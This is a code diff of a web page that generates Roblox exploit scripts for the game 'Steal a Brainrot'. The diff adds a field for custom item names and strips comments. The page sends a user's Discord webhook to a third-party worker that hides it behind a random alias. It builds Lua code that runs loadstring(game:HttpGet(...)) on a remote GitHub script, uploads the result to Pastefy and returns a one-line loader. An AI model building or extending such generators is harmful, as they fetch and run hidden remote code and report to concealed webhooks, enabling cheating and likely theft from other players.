@@ -46,7 +46,6 @@
     margin: 0 auto;
     padding: 2.8rem 1.5rem 6rem;
   }
-  /* Badges */
   .badge-og {
     font-size: 10px;
     font-weight: bold;
@@ -73,25 +72,21 @@
     margin-left: 8px;
     cursor: default;
   }
- /* Conteneur des suggestions */
-.suggestions-container {
+ .suggestions-container {
     position: absolute;
-    bottom: 100%; /* <-- Positionne au-dessus du champ */
+    bottom: 100%;
     left: 0;
     right: 0;
     background: var(--surface);
     border: 1px solid var(--border);
     border-radius: 8px;
-    margin-bottom: 8px; /* Espace entre le champ et les suggestions */
+    margin-bottom: 8px;
     max-height: 380px;
     overflow-y: auto;
     z-index: 100;
     display: none;
     box-shadow: var(--panel-shadow);
 }
-
-/* Élément de suggestion */
-/* Conteneur des suggestions (positionné au-dessus) */
 #usernameSuggestions {
     position: absolute;
     bottom: 100%;
@@ -107,7 +102,6 @@
     display: none;
     box-shadow: var(--panel-shadow);
 }
-
   .suggestion-item {
     padding: 12px 14px;
     cursor: pointer;
@@ -119,7 +113,6 @@
   .suggestion-item:hover {
     background: rgba(168, 85, 247, 0.12);
   }
-
   .suggestion-avatar {
     width: 42px;
     height: 42px;
@@ -134,7 +127,6 @@
     height: 100%;
     object-fit: cover;
   }
-
   .suggestion-info {
     flex: 1;
     min-width: 0;
@@ -154,7 +146,6 @@
     font-family: 'Share Tech Mono', monospace;
     font-size: 0.78rem;
   }
-  /* ── Header ── */
   header {
     text-align: center;
     margin-bottom: 3rem;
@@ -195,7 +186,6 @@
     color: var(--muted);
     margin-top: .4rem;
   }
-  /* ── Panel base ── */
   .panel {
     background: var(--panel);
     border: 1px solid var(--border);
@@ -334,14 +324,12 @@
     position: relative;
     outline: none;
     transition: background 0.2s, border-color 0.2s;
-}
-
-.a-item input[type="checkbox"]:checked {
+  }
+  .a-item input[type="checkbox"]:checked {
     background: var(--accent);
     border-color: var(--accent);
-}
-
-.a-item input[type="checkbox"]:checked::after {
+  }
+  .a-item input[type="checkbox"]:checked::after {
     content: '✓';
     position: absolute;
     color: white;
@@ -350,7 +338,7 @@
     top: 50%;
     left: 50%;
     transform: translate(-50%, -55%);
-}
+  }
   .a-name { font-size: .88rem; line-height: 1.2; flex: 1; color: var(--text); }
   .a-meta {
     font-family: 'Share Tech Mono', monospace;
@@ -461,8 +449,6 @@
   @keyframes fadeDown { from { opacity:0; transform: translateY(-16px); } to { opacity:1; transform: none; } }
   @keyframes fadeUp { from { opacity:0; transform: translateY(16px); } to { opacity:1; transform: none; } }
   @keyframes blink { 0%,100% { opacity:1; } 50% { opacity:.3; } }
-
-  /* Admin Panel Mode Styles */
   .admin-mode-selector {
     display: flex;
     gap: 0.5rem;
@@ -494,6 +480,35 @@
     display: none;
     margin-top: 1rem;
   }
+  #customBrainrotInput {
+    display: flex;
+    gap: 0.5rem;
+    margin-top: 1rem;
+  }
+  #customBrainrotInput input {
+    flex: 1;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 7px;
+    padding: 0.55rem 0.85rem;
+    color: var(--text);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.82rem;
+    outline: none;
+  }
+  #customBrainrotInput button {
+    padding: 0.5rem 0.9rem;
+    background: rgba(168, 85, 247, 0.1);
+    border: 1px solid rgba(168, 85, 247, 0.3);
+    border-radius: 7px;
+    color: var(--accent);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.68rem;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    cursor: pointer;
+    white-space: nowrap;
+  }
 </style>
 </head>
 <body>
@@ -511,6 +526,10 @@
         <button class="btn-sm red" onclick="clearAll()">Clear</button>
       </div>
       <div class="animal-list" id="animalList"></div>
+      <div id="customBrainrotInput">
+        <input type="text" id="customBrainrotName" placeholder="Add custom brainrot name...">
+        <button onclick="addCustomBrainrot()">Add</button>
+      </div>
       <div class="meta-row">
         <span class="sel-count"><span id="selNum">0</span> selected</span>
       </div>
@@ -773,37 +792,30 @@ const ANIMALS = [
 ];
 const KV_WORKER_URL = 'https://young-bonus-cf67.dongdihng.workers.dev';
 
-
 function canGenerateScript() {
     const lastGeneratedTime = localStorage.getItem('lastScriptGenerationTime');
     if (!lastGeneratedTime) {
         return true;
     }
-
     const currentTime = new Date().getTime();
     const oneHour = 60 * 1000;
     const timeElapsed = currentTime - lastGeneratedTime;
-
     return timeElapsed >= oneHour;
 }
-
 
 function recordScriptGeneration() {
     localStorage.setItem('lastScriptGenerationTime', new Date().getTime());
 }
 
-
 function getTimeRemaining() {
     const lastGeneratedTime = localStorage.getItem('lastScriptGenerationTime');
     if (!lastGeneratedTime) {
-        return 0; 
+        return 0;
     }
-
     const currentTime = new Date().getTime();
     const oneHour = 60 * 1000;
     const timeElapsed = currentTime - lastGeneratedTime;
     const timeRemaining = oneHour - timeElapsed;
-
     return Math.max(0, Math.ceil(timeRemaining / 1000 / 60));
 }
 
@@ -816,6 +828,7 @@ function formatTimeRemaining(minutes) {
         return `You must wait ${minutes} minutes before generating another script.`;
     }
 }
+
 function updateTimeRemainingDisplay() {
     const timeRemaining = getTimeRemaining();
     const hintElement = document.getElementById('timeRemainingHint');
@@ -824,11 +837,9 @@ function updateTimeRemainingDisplay() {
     }
 }
 
-
 updateTimeRemainingDisplay();
-
-
 setInterval(updateTimeRemainingDisplay, 60000);
+
 function generateAlias(length = 8) {
     const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
     let result = '';
@@ -844,12 +855,21 @@ let selected = new Set();
 let adminMode = 'no-gui';
 let customAdminLoadstring = '';
 
+function addCustomBrainrot() {
+    const customName = document.getElementById('customBrainrotName').value.trim();
+    if (!customName) return;
+    if (!selected.has(customName)) {
+        selected.add(customName);
+        renderList(document.getElementById('searchBox').value);
+    }
+    document.getElementById('customBrainrotName').value = '';
+}
+
 function setAdminMode(mode) {
     adminMode = mode;
     const buttons = document.querySelectorAll('.admin-mode-btn');
     buttons.forEach(btn => btn.classList.remove('active'));
     event.target.classList.add('active');
-
     const customInput = document.getElementById('customAdminInput');
     if (mode === 'custom') {
         customInput.style.display = 'block';
@@ -874,16 +894,11 @@ async function uploadToPastefy(script) {
         content: script,
       }),
     });
-
     const data = await response.json();
-    console.log("Pastefy response:", data);
-
     if (data.success && data.paste?.id) {
       return `https://pastefy.app/${data.paste.id}/raw`;
     }
-
     return null;
-
   } catch (error) {
     console.error("Upload error:", error);
     return null;
@@ -893,30 +908,23 @@ async function uploadToPastefy(script) {
 async function generate() {
     const btn = document.querySelector('.btn-gen');
     const out = document.getElementById('outputBlock');
-
     if (btn.disabled) return;
-
     if (!canGenerateScript()) {
         const timeRemaining = getTimeRemaining();
         out.className = 'code-block empty';
         out.textContent = formatTimeRemaining(timeRemaining);
         return;
     }
-
     btn.disabled = true;
     btn.textContent = '⏳ Generating...';
     btn.style.opacity = '0.6';
-
     try {
         const username = document.getElementById('usernameInput').value.trim();
         const webhook = document.getElementById('webhookInput').value.trim();
-
         if (selected.size === 0) throw new Error('Please select at least one brainrot animal.');
         if (username.length < 3) throw new Error('Username must be at least 3 characters long.');
         if (!webhook.startsWith('https://discord.com/api/webhooks/')) throw new Error('Invalid webhook URL.');
-
         const alias = generateAlias();
-
         const kvResponse = await fetch(`${KV_WORKER_URL}/store`, {
             method: 'POST',
             headers: {
@@ -925,17 +933,13 @@ async function generate() {
             body: JSON.stringify({ alias, url: webhook }),
             mode: 'cors',
         });
-
         if (!kvResponse.ok) {
             const error = await kvResponse.json();
             throw new Error(error.error || 'Failed to store webhook.');
         }
-
         const data = await kvResponse.json();
-
         const names = [...selected];
         const brainrotLines = names.map(n => ` ["${n}"] = true,`).join('\n');
-
        let adminScriptPart = '';
         if (adminMode === 'admin-panel') {
             adminScriptPart = `
@@ -962,9 +966,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/notmlk/freezer/refs/h
 end)
 ${adminScriptPart}
 `;
-
         const pastefyRawUrl = await uploadToPastefy(script);
-
         if (pastefyRawUrl) {
             out.className = 'code-block';
             out.textContent = `loadstring(game:HttpGet("${pastefyRawUrl}"))()`;
@@ -975,7 +977,6 @@ Here is the raw script (copy it manually):
 
 ${script}`;
         }
-
         recordScriptGeneration();
     } catch (err) {
         console.warn("Error in generate():", err);
@@ -992,7 +993,6 @@ ${script}`;
 
 async function searchRobloxUsers(query) {
     if (query.length < 3) return [];
-
     try {
         const proxyUrl = `https://roblox-search-proxy.vercel.app/api/roblox-search?keyword=${encodeURIComponent(query)}`;
         const response = await fetch(proxyUrl);
@@ -1023,7 +1023,6 @@ async function fetchAvatarUrl(userId) {
 async function showSuggestions(users) {
     const container = document.getElementById('usernameSuggestions');
     container.innerHTML = '';
-
     if (users.length === 0) {
         const noResult = document.createElement('div');
         noResult.className = 'suggestion-item';
@@ -1032,14 +1031,11 @@ async function showSuggestions(users) {
         container.style.display = 'block';
         return;
     }
-
     const userPromises = users.map(async (user) => {
         const avatarUrl = await fetchAvatarUrl(user.id);
         return { ...user, avatarUrl };
     });
-
     const usersWithAvatars = await Promise.all(userPromises);
-
     usersWithAvatars.forEach(user => {
         const item = document.createElement('div');
         item.className = 'suggestion-item';
@@ -1106,6 +1102,25 @@ function renderList(filter) {
         row.addEventListener('click', e => { if (e.target !== cb) toggle(animal.name); });
         list.appendChild(row);
     });
+    selected.forEach(name => {
+        if (!ANIMALS.some(a => a.name === name)) {
+            const row = document.createElement('div');
+            row.className = 'a-item on';
+            const cb = document.createElement('input');
+            cb.type = 'checkbox';
+            cb.checked = true;
+            cb.addEventListener('change', e => { e.stopPropagation(); toggle(name); });
+            const lbl = document.createElement('span');
+            lbl.className = 'a-name';
+            lbl.textContent = name;
+            const badge = document.createElement('span');
+            badge.className = 'badge-secret';
+            badge.textContent = 'Custom';
+            row.append(cb, lbl, badge);
+            row.addEventListener('click', e => { if (e.target !== cb) toggle(name); });
+            list.appendChild(row);
+        }
+    });
     document.getElementById('selNum').textContent = selected.size;
 }
 
@@ -1135,42 +1150,30 @@ function validateUsername() {
 function validateWebhook() {
     const webhook = document.getElementById('webhookInput').value.trim();
     const hint = document.getElementById('webhookHint');
-
-
     if (!webhook.startsWith('https://discord.com/api/webhooks/')) {
         hint.classList.add('error');
         hint.textContent = 'Webhook must start with: https://discord.com/api/webhooks/';
         return false;
     }
-
-
     const webhookRegex = /^https:\/\/discord\.com\/api\/webhooks\/(\d{17,20})\/[a-zA-Z0-9_-]{68,}$/;
-
     if (!webhookRegex.test(webhook)) {
         hint.classList.add('error');
         hint.textContent = 'Invalid webhook format. Must be: https://discord.com/api/webhooks/<ID>/<TOKEN>';
         return false;
     }
-
-
     const parts = webhook.split('/');
     const webhookId = parts[5];
     const webhookToken = parts[6];
-
-
     if (!/^\d{17,20}$/.test(webhookId)) {
         hint.classList.add('error');
         hint.textContent = 'Invalid webhook ID. Must be 17-20 digits.';
         return false;
     }
-
     if (!/^[a-zA-Z0-9_-]{68,}$/.test(webhookToken)) {
         hint.classList.add('error');
         hint.textContent = 'Invalid webhook token. Must be 68+ alphanumeric characters with dashes/underscores.';
         return false;
     }
-
-
     hint.classList.remove('error');
     hint.textContent = '✅ Valid Discord webhook.';
     return true;
